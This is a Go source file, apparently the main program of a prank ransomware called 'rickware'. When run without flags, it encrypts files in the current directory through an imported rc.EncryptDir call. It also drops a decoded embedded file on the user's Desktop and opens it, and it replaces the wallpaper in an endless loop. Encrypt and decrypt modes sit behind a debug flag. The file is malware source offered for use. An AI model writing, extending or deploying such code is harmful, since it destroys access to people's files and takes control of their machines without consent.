package main

import (
	_ "embed"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path"
	"rickware/rc"
	"runtime"
	"time"

	"github.com/reujab/wallpaper"
)

const link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

func openBrowser(url string) {
	var err error

	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}
	if err != nil {
		log.Fatal(err)
	}
}

func setWallpaper() {
	imgs := []string{
		"https://filmdaily.co/wp-content/uploads/2021/02/rick-lede-1-1300x650.jpg",
		"https://uploads.dailydot.com/2021/02/rick-astley-4k.jpeg?fm=pjpg&ixlib=php-3.3.0",
		"https://www.electronicbeats.net/app/uploads/2016/06/rickastley.jpg",
		"https://resources.stuff.co.nz/content/dam/images/1/e/n/2/t/p/image.related.StuffLandscapeSixteenByNine.1420x800.1enbck.png/1475795018599.jpg",
		"https://www.telegraph.co.uk/content/dam/music/2016/08/04/104202928_rick-astley-MUSIC-xlarge_trans_NvBQzQNjv4BqOLSIyYLmkFq7W-G_CKMXcQ4K7MKFpnL2jN-fEibc8Ts.jpg",
		"https://www.rollingstone.de/wp-content/uploads/2018/07/31/15/rick-astley-gettyimages-144537981.jpg",
	}

	idx := 0
	for {
		wallpaper.SetFromURL(imgs[idx])
		idx++
		if idx == len(imgs) {
			idx = 0
		}
	}

}

func decode(b64 string, name string) {
	dec, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		panic(err)
	}

	f, err := os.Create(name)
	if err != nil {
		panic(err)
	}

	if _, err := f.Write(dec); err != nil {
		panic(err)
	}
	if err := f.Sync(); err != nil {
		panic(err)
	}
	if err := f.Close(); err != nil {
		panic(err)
	}
}

//go:embed b64sm.txt
var s string

var debug bool
var rick bool
var derick bool

func main() {
	flag.BoolVar(&debug, "debug", false, "enables debug test block")
	flag.BoolVar(&rick, "r", false, "")
	flag.BoolVar(&derick, "d", false, "")
	flag.Parse()
	if debug {
		fmt.Println("[INFO] Debug mode entered")
		if rick {
			rc.EncryptDir("./")
		} else if derick {
			rc.DecryptDir("./")
		} else {
			fmt.Println("invalid command line flags")
		}
	} else {
		go setWallpaper()

		usr, err := user.Current()
		if err != nil {
			log.Fatalf(err.Error())
		}

		name := fmt.Sprint(s[0:100], ".mp4")
		p := path.Join(usr.HomeDir, "Desktop", name)
		decode(s, p)
		openBrowser(p)
		go rc.EncryptDir("./")
		// go func() {
		// 	for i := 0; i < 100; i++ {
		// 		decode(s, fmt.Sprint(i, name))
		// 	}
		// }()
		for {
			time.Sleep(time.Second * 1)
		}
	}
}
